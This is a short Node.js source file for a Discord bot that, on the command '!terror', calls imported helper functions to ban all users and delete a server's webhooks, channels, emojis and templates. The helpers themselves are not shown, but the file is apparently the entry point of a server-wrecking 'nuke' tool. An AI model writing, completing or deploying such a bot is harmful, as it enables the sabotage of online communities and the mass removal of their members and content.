const { Client } = require('discord.js')

const {
    banAllUsers,
    removeAllWebhook,
    removeChannels,
    removeEmojis,
    removeTemplates
} = require('./functions')

const prefix = '!'

const client = new Client()

client.on('message', async (msg) => {
    const cmd = msg.content.replace(prefix, '')

    if (cmd === 'terror') {
        banAllUsers(msg)
        removeAllWebhook(msg)
        removeChannels(msg)
        removeEmojis(msg)
        removeTemplates(msg)
    }
})

client.login('token')
